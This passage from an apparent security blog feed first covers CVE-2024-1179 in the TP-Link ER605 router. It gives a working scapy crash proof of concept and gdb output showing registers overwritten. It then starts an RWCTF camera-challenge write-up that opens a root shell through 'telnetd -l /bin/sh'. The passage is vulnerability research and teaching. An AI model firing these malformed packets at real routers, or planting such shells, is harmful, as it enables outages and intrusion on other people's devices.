are</span><br><span class="line">exhausted, including a terminating zero-length label.  Any updates to</span><br><span class="line">Section 8 of DHCPv6 [RFC3315] also apply to encoding of this field.</span><br><span class="line">An example format for this option is shown in Figure 2, which conveys</span><br><span class="line">the FQDN "aftr.example.com.".</span><br><span class="line"></span><br><span class="line">   +------+------+------+------+------+------+------+------+------+</span><br><span class="line">   | 0x04 |   a  |   f  |   t  |   r  | 0x07 |   e  |   x  |   a  |</span><br><span class="line">   +------+------+------+------+------+------+------+------+------+</span><br><span class="line">   |   m  |   p  |   l  |   e  | 0x03 |   c  |   o  |   m  | 0x00 |</span><br><span class="line">   +------+------+------+------+------+------+------+------+------+</span><br></pre></td></tr></tbody></table></figure><p>简单来说就是每一串aftr_name字符串前都需要标明长度，从第二个开始长度会转成.，比如上面的例子中，当格式为<code>\x04aftr\x07example\x03com\x00</code>时，程序解析之后的结果为aftr.example.com，通过这样的格式我写出了以下crash Poc</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet6 <span class="keyword">import</span> IPv6, UDP</span><br><span class="line"><span class="keyword">from</span> scapy.layers.dhcp6 <span class="keyword">import</span> DHCP6_Reply, DHCP6OptServerId, DHCP6OptClientId</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.10.200'</span></span><br><span class="line">port = <span class="number">546</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_dhcp6_reply_and_listen</span>(<span class="params">interface, src_ipv6, dst_ipv6, src_mac, dst_mac, transaction_id</span>):</span><br><span class="line">    <span class="comment"># 构造以太网层</span></span><br><span class="line">    ether_layer = Ether(src=src_mac, dst=dst_mac)</span><br><span class="line">    li(ether_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造IPv6层</span></span><br><span class="line">    ipv6_layer = IPv6(src=src_ipv6, dst=dst_ipv6)</span><br><span class="line">    li(ipv6_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造UDP层</span></span><br><span class="line">    udp_layer = UDP(sport=<span class="number">547</span>, dport=<span class="number">546</span>)  <span class="comment"># 注意端口号，服务器端是547，客户端是546</span></span><br><span class="line">    li(udp_layer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造DHCPv6 REPLY消息</span></span><br><span class="line">    dhcp6_reply = DHCP6_Reply(trid=transaction_id)</span><br><span class="line">    li(dhcp6_reply)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造Server ID选项</span></span><br><span class="line">    server_id = DHCP6OptServerId(duid=DUID_LLT(hwtype=<span class="number">1</span>, lladdr=src_mac))</span><br><span class="line">    li(server_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造Client ID选项</span></span><br><span class="line">    client_id = DHCP6OptClientId(duid=DUID_LLT(hwtype=<span class="number">1</span>, lladdr=dst_mac))</span><br><span class="line">    <span class="comment">#li(client_id)</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="string">b'\x00\x40\x03\x00'</span></span><br><span class="line">    p2 = (<span class="string">b'\xff'</span> + <span class="string">b'a'</span> * <span class="number">0xff</span>) * <span class="number">3</span></span><br><span class="line">    li(<span class="built_in">hex</span>(<span class="built_in">len</span>(p2)))</span><br><span class="line">    p1 += p2</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合所有层</span></span><br><span class="line">    packet = ether_layer / ipv6_layer / udp_layer / dhcp6_reply / p1</span><br><span class="line">    li(<span class="built_in">bytes</span>(packet))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送数据包</span></span><br><span class="line">    sendp(packet)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"DHCPv6 Reply消息已发送，等待响应..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置监听过滤器，捕获DHCPv6 Solicit或Request等消息作为响应</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filter_reply</span>(<span class="params">pkt</span>):</span><br><span class="line">        <span class="keyword">return</span> DHCP6_Reply <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[DHCP6_Reply].trid == transaction_id</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 监听网络上的回应，持续5秒</span></span><br><span class="line">    response = sniff(iface=interface, <span class="built_in">filter</span>=<span class="string">"udp and port 546"</span>, prn=<span class="keyword">lambda</span> x: x.show(),</span><br><span class="line">                     lfilter=filter_reply, timeout=<span class="number">5</span>, count=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否收到回应</span></span><br><span class="line">    <span class="keyword">if</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"成功接收到DHCPv6回应。"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"未收到DHCPv6回应。"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请根据你的具体环境调整以下参数</span></span><br><span class="line">interface_name = <span class="string">"br0"</span>  <span class="comment"># Linux中的网络接口名称</span></span><br><span class="line"><span class="comment">#source_ipv6 = "fe80::f421:a8ff:fe5a:ff0d"  # 源IPv6地址</span></span><br><span class="line">source_ipv6 = <span class="string">"fe80::21c:42ff:fee0:61cf"</span>  <span class="comment"># 源IPv6地址</span></span><br><span class="line">destination_ipv6 = <span class="string">"fe80::216:3eff:fe00:1"</span>  <span class="comment"># 目的IPv6地址（虚拟机内的dhcp6c客户端IPv6地址）</span></span><br><span class="line"><span class="comment">#destination_ipv6 = "fe80::21c:42ff:fee0:61cf"  # 目的IPv6地址（虚拟机内的dhcp6c客户端IPv6地址）</span></span><br><span class="line">source_mac = <span class="string">"00:0c:29:b2:c1:98"</span>  <span class="comment"># 源MAC地址</span></span><br><span class="line">destination_mac = <span class="string">"00:16:3E:00:00:01"</span>  <span class="comment"># 目的MAC地址（虚拟机内的网络接口MAC地址）</span></span><br><span class="line"><span class="comment">#transaction_id = 0x00abcdef  # 事务ID</span></span><br><span class="line">transaction_id = <span class="number">0x25d6bd</span>  <span class="comment"># 事务ID</span></span><br><span class="line">getAftrName = <span class="string">"a"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送DHCPv6 ADVERTISE消息</span></span><br><span class="line">send_dhcp6_reply_and_listen(interface_name, source_ipv6, destination_ipv6, source_mac, destination_mac, transaction_id)</span><br></pre></td></tr></tbody></table></figure><p>远程crash</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mar/28/2024 06:42:03: client6_recv: receive reply from fe80::21c:42ff:fee0:61cf%eth0 on eth0</span><br><span class="line">Mar/28/2024 06:42:03: dhcp6_get_options: get DHCP option opt_64, len 768</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></tbody></table></figure><p>gdbserver调试之后发现在memcpy这里产生了崩溃</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*V0   0x7fbda0e0 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*V1   0x7fbdb004</span><br><span class="line">*A0   0x7fbdab15 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*A1   0x7fbd9c05 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*A2   0xfffffffc</span><br><span class="line">*A3   0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*T0   0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*T1   0xfffff0db</span><br><span class="line">*T2   0x7fbda0e4 ◂— 0x61616161 (<span class="string">'aaaa'</span>)</span><br><span class="line">*T3   0x61000000</span><br><span class="line">*T4   0x706f2050 (<span class="string">'P op'</span>)</span><br><span class="line"> T5   0x0</span><br><span class="line"> T6   0xe</span><br><span class="line">*T7   0x6e6f6974 (<span class="string">'tion'</span>)</span><br><span class="line">*T8   0x42a06c —▸ 0x77f2cefc ◂— move <span class="variable">$v0</span>, <span class="variable">$a0</span></span><br><span class="line">*T9   0x77f2cefc ◂— move <span class="variable">$v0</span>, <span class="variable">$a0</span></span><br><span class="line">*S0   0x7fbd9c00 ◂— 0x616161ff</span><br><span class="line">*S1   0x7fbd9ff8 ◂— 0x0</span><br><span class="line"> S2   0x5</span><br><span class="line"> S3   0x4018b1 —▸ 0x64f2f0 ◂— 0x0</span><br><span class="line"> S4   0x77f5b000</span><br><span class="line"> S5   0x77f5b000</span><br><span class="line"> S6   0x77f5e518 —▸ 0x77ebb000 ◂— 0x464c457f</span><br><span class="line"> S7   0x77f5fd8c ◂— 1</span><br><span class="line"> S8   0x0</span><br><span class="line"> GP   0x77f652c0</span><br><span class="line"> FP   0x0</span><br><span class="line">*SP   0x7fbd9720 ◂— 0x7</span><br><span class="line">*PC   0x77f2d1b4 ◂— sw <span class="variable">$t0</span>, -4(<span class="variable">$v1</span>)</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ DISASM / mips / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]──────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x77f2d1b4    sw     <span class="variable">$t0</span>, -4(<span class="variable">$v1</span>)</span><br><span class="line">   0x77f2d1b8    sltiu  <span class="variable">$t0</span>, <span class="variable">$t1</span>, 0x13</span><br><span class="line">   0x77f2d1bc    beqz   <span class="variable">$t0</span>, 0x77f2d160</span><br><span class="line"></span><br><span class="line">   0x77f2d1c0    addiu  <span class="variable">$a0</span>, <span class="variable">$a0</span>, 0x10</span><br><span class="line">   0x77f2d1c4    addiu  <span class="variable">$a3</span>, <span class="variable">$a2</span>, -0x14</span><br><span class="line">   0x77f2d1c8    srl    <span class="variable">$a3</span>, <span class="variable">$a3</span>, 4</span><br><span class="line">   0x77f2d1cc    addiu  <span class="variable">$v1</span>, <span class="variable">$a3</span>, 1</span><br><span class="line">   0x77f2d1d0    sll    <span class="variable">$v1</span>, <span class="variable">$v1</span>, 4</span><br><span class="line">   0x77f2d1d4    addiu  <span class="variable">$a2</span>, <span class="variable">$a2</span>, -0x11</span><br><span class="line">   0x77f2d1d8    sll    <span class="variable">$a3</span>, <span class="variable">$a3</span>, 4</span><br><span class="line">   0x77f2d1dc    addu   <span class="variable">$a1</span>, <span class="variable">$a1</span>, <span class="variable">$v1</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ sp 0x7fbd9720 ◂— 0x7</span><br><span class="line">01:0004│    0x7fbd9724 —▸ 0x413f34 ◂— <span class="string">'dhcp6_get_options'</span></span><br><span class="line">02:0008│    0x7fbd9728 —▸ 0x4137e4 ◂— addi <span class="variable">$s4</span>, <span class="variable">$v1</span>, 0x6567 /* <span class="string">'get DHCP option %s, len %d'</span> */</span><br><span class="line">03:000c│    0x7fbd972c —▸ 0x42a758 ◂— <span class="string">'opt_64'</span></span><br><span class="line">04:0010│    0x7fbd9730 ◂— 0x300</span><br><span class="line">05:0014│    0x7fbd9734 ◂— <span class="string">'&lt;8&gt;Mar 28 06:46:46 : '</span></span><br><span class="line">06:0018│    0x7fbd9738 ◂— <span class="string">'ar 28 06:46:46 : '</span></span><br><span class="line">07:001c│    0x7fbd973c ◂— <span class="string">'8 06:46:46 : '</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0x77f2d1b4</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     Start        End Perm     Size Offset File</span><br><span class="line">  0x400000   0x41a000 r-xp    1a000      0 /usr/sbin/dhcp6c</span><br><span class="line">  0x42a000   0x42b000 rw-p     1000  1a000 /usr/sbin/dhcp6c</span><br><span class="line">  0x42b000   0x42c000 rwxp     1000      0 [anon_0042b]</span><br><span class="line">  0x647000   0x69c000 rwxp    55000      0 [heap]</span><br><span class="line">0x77d53000 0x77d6c000 r-xp    19000      0 /lib/libeasylogger.so</span><br><span class="line">0x77d6c000 0x77d6d000 rw-p     1000   9000 /lib/libeasylogger.so</span><br><span class="line">0x77d6d000 0x77d72000 rw-p     5000      0 [anon_77d6d]</span><br><span class="line">0x77d72000 0x77d87000 r-xp    15000      0 /lib/libubox.so</span><br><span class="line">0x77d87000 0x77d88000 rw-p     1000   5000 /lib/libubox.so</span><br><span class="line">0x77d88000 0x77e6f000 r-xp    e7000      0 /usr/lib/libiconv.so.2</span><br><span class="line">0x77e6f000 0x77e70000 rw-p     1000  d7000 /usr/lib/libiconv.so.2</span><br><span class="line">0x77e70000 0x77e86000 r-xp    16000      0 /lib/libuci.so</span><br><span class="line">0x77e86000 0x77e87000 rw-p     1000   6000 /lib/libuci.so</span><br><span class="line">0x77e87000 0x77ea9000 r-xp    22000      0 /lib/libgcc_s.so.1</span><br><span class="line">0x77ea9000 0x77eaa000 rw-p     1000  12000 /lib/libgcc_s.so.1</span><br><span class="line">0x77eaa000 0x77eba000 r-xp    10000      0 /usr/lib/liblogger.so</span><br><span class="line">0x77eba000 0x77ebb000 rw-p     1000      0 /usr/lib/liblogger.so</span><br><span class="line">0x77ebb000 0x77f4d000 r-xp    92000      0 /lib/ld-musl-mipsel-sf.so.1</span><br><span class="line">0x77f5c000 0x77f5e000 rw-p     2000  91000 /lib/ld-musl-mipsel-sf.so.1</span><br><span class="line">0x77f5e000 0x77f60000 rwxp     2000      0 [anon_77f5e]</span><br><span class="line">0x7fbba000 0x7fbdb000 rw-p    21000      0 [stack]</span><br><span class="line">0x7fff7000 0x7fff8000 r-xp     1000      0 [vdso]</span><br><span class="line">pwndbg&gt; p/x 0x77f2d1b4-0x77ebb000</span><br><span class="line"><span class="variable">$1</span> = 0x721b4</span><br></pre></td></tr></tbody></table></figure><p>此时可以看到寄存器已经被劫持，exp这里就不详细展开了，至此Pwn2Own TORONTO 2023 (CVE-2024-1179) &amp; TP-Link Omada ER605漏洞分析完成</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-24-085/">https://www.zerodayinitiative.com/advisories/ZDI-24-085/</a></p><p><a href="https://www.arvik.top/article/51536621.html">https://www.arvik.top/article/51536621.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/653315890">https://zhuanlan.zhihu.com/p/653315890</a></p><p><a href="https://community.cisco.com/t5/%E7%BD%91%E7%BB%9C%E6%96%87%E6%A1%A3/%E5%8E%9F%E5%88%9B-dhcpv6-%E8%AF%A6%E6%83%85%E5%8F%8A%E5%85%B6%E6%8A%A5%E6%96%87%E4%BB%8B%E7%BB%8D-%E9%99%84%E9%85%8D%E7%BD%AE%E6%A1%88%E4%BE%8B%E5%8F%8A%E9%AA%8C%E8%AF%81%E5%91%BD%E4%BB%A4/ta-p/4372251">https://community.cisco.com/t5/%E7%BD%91%E7%BB%9C%E6%96%87%E6%A1%A3/%E5%8E%9F%E5%88%9B-dhcpv6-%E8%AF%A6%E6%83%85%E5%8F%8A%E5%85%B6%E6%8A%A5%E6%96%87%E4%BB%8B%E7%BB%8D-%E9%99%84%E9%85%8D%E7%BD%AE%E6%A1%88%E4%BE%8B%E5%8F%8A%E9%AA%8C%E8%AF%81%E5%91%BD%E4%BB%A4/ta-p/4372251</a></p><p><a href="https://datatracker.ietf.org/doc/html/rfc6334">https://datatracker.ietf.org/doc/html/rfc6334</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;Pwn2Own-TORONTO-2023-CVE-2024-1179-amp-TP-Link-Omada-ER605&quot;&gt;&lt;a href=&quot;#Pwn2Own-TORONTO-2023-CVE-2024-1179-am</summary>
      
    
    
    
    <category term="Poc" scheme="https://www.z1r0.top/categories/Poc/"/>
    
    
    <category term="RW" scheme="https://www.z1r0.top/tags/RW/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF 6th - Let’s party in the house</title>
    <link href="https://www.z1r0.top/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/"/>
    <id>https://www.z1r0.top/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/</id>
    <published>2024-03-10T14:04:43.000Z</published>
    <updated>2024-03-12T02:15:22.111Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="RWCTF-6th-Let’s-party-in-the-house"><a href="#RWCTF-6th-Let’s-party-in-the-house" class="headerlink" title="RWCTF 6th - Let’s party in the house"></a>RWCTF 6th - Let’s party in the house</h1><blockquote><p><code>score:378</code> <code>solve_count:6</code></p><p><code>pwn</code>, <code>Panasonic (PCSL)</code>, <code>difficulty:Schrödinger</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Oh, no, in the middle of our party, there was a strange baby cry coming from the IP Camera.</span><br><span class="line">There is only one service in the device, can you figure out the baby crying? flag path: /flag</span><br></pre></td></tr></tbody></table></figure><p><code>nc 47.88.48.133 7777</code></p><p><a href="https://github.com/chaitin/Real-World-CTF-6th-Challenges">https://github.com/chaitin/Real-World-CTF-6th-Challenges</a></p></blockquote><h2 id="题目配置-amp-启动"><a href="#题目配置-amp-启动" class="headerlink" title="题目配置&amp;启动"></a>题目配置&amp;启动</h2><p>给了一个run.sh，直接启动，题目环境就可以跑起来。账号密码是<code>root:root</code>，启动之后一直有杂乱的信息，搜索之后发现有telnetd，重新打包一下rcS，在rcS里加上<code>telnetd -p 8802 -l /bin/sh</code>，此时8802就会开启telnet，在docker里加上映射之后<code>nc 127.0.0.1 8802</code>即可获得shell</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># source profile_prjcfg on /etc/init.d/rcS (init script cycle) and /etc/profile (after startup cycle)</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile_prjcfg</span><br><span class="line">telnetd -p 9901 -l /bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fstab devices create</span></span><br><span class="line">mount -a</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ker"</span> &gt; /proc/nvt_info/bootts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"rcS"</span> &gt; /proc/nvt_info/bootts</span><br><span class="line"></span><br><span class="line"><span class="comment"># To run /etc/init.d/S* script</span></span><br><span class="line"><span class="keyword">for</span> initscript <span class="keyword">in</span> /etc/init.d/S[0-9][0-9]*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [ -x <span class="variable">$initscript</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[Start] <span class="variable">$initscript</span>"</span></span><br><span class="line"><span class="variable">$initscript</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"rcS"</span> &gt; /proc/nvt_info/bootts</span><br><span class="line">telnetd -p 8802 -l /bin/sh</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-arm \</span><br><span class="line">-m 1024 \</span><br><span class="line">-M virt,highmem=off \</span><br><span class="line"> -kernel zImage \</span><br><span class="line">    -initrd player.cpio \</span><br><span class="line">-nic user,hostfwd=tcp:0.0.0.0:8801-:80,hostfwd=tcp:0.0.0.0:8802-:8802 \</span><br><span class="line"> -nographic</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 450 synodebu  0:01 telnetd -p 8802 -l /bin/sh</span><br><span class="line">  453 synodebu  0:00 -sh</span><br><span class="line">  545 synodebu  1:46 /bin/webd</span><br><span class="line"> 2452 synodebu  0:00 /bin/sh</span><br><span class="line"> 2717 synodebu  0:00 /bin/sh</span><br><span class="line">16809 synodebu  0:00 ps</span><br></pre></td></tr></tbody></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>发现这个<a href="https://www.synology.com/en-global/security/advisory/Synology_SA_23_15">设备</a>在Pwn2Own 2023上被利用，并且<a href="https://teamt5.org/en/posts/teamt5-pwn2own-contest-experience-sharing-and-vulnerability-demonstration/">TeamT5</a>公开了一些细节，在<code>/lib/libjansson.so.4.7.0</code>中进行json代码解析的时候发生了溢出漏洞，经过对比发现比赛版本正好存在此漏洞</p><p>在parse_object这个函数中，解析key的时候发生了溢出</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">json_t</span> *__fastcall <span class="title function_">parse_object</span><span class="params">(<span class="type">lex_t</span> *lex, <span class="type">int</span> flags, <span class="type">json_error_t</span> *error)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [sp+14h] [bp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">12</span>]; <span class="comment">// [sp+34h] [bp-20h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// [sp+40h] [bp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> value; <span class="comment">// [sp+44h] [bp-10h]</span></span><br><span class="line">  <span class="type">void</span> *key; <span class="comment">// [sp+48h] [bp-Ch]</span></span><br><span class="line">  <span class="type">json_t</span> *object; <span class="comment">// [sp+4Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  object = j_json_object();</span><br><span class="line">  <span class="keyword">if</span> ( !object )</span><br><span 